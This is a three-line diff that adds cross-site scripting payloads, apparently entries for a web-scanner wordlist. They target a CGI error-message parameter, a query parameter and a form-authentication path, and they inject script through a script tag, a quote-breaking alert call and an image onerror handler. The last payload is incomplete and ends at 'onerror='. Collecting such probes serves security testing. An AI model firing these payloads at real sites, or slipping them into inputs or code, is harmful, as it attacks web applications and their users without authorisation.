@@ -1,0 +1,3 @@
+/free_time_failed.cgi?err_msg=<script>alert(document.domain);</script>
+/?mp_idx=%22;alert(%271%27);//
+/Forms/rpAuth_1?id=</form><iMg%20src=x%20onerror=
